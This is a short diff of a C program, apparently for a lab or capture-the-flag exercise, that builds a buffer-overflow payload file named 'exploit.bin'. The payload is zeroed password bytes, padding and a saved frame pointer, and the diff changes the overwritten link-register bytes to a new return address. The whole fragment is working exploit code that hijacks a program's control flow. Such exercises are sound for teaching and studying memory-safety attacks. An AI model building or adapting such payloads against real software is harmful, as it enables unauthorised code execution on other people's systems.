@@ -17,7 +17,7 @@ int main() {
         0, 0, 0, 0, 0, 0, 0, 0,         // password bytes 0-7
         0, 0, 0, 0, 0, 0, 0, 0,         // password bytes 8-11, 4 padding
         0, 0, 0, 0, 0, 0, 0, 0,         // fp
-        0x30, 0x09, 0x55, 0x55, 0x55, 0, 0, 0   // lr
+        0x94, 0x08, 0x55, 0x55, 0x55, 0, 0, 0   // lr
     };
 
     FILE *fp = fopen("exploit.bin", "wb");
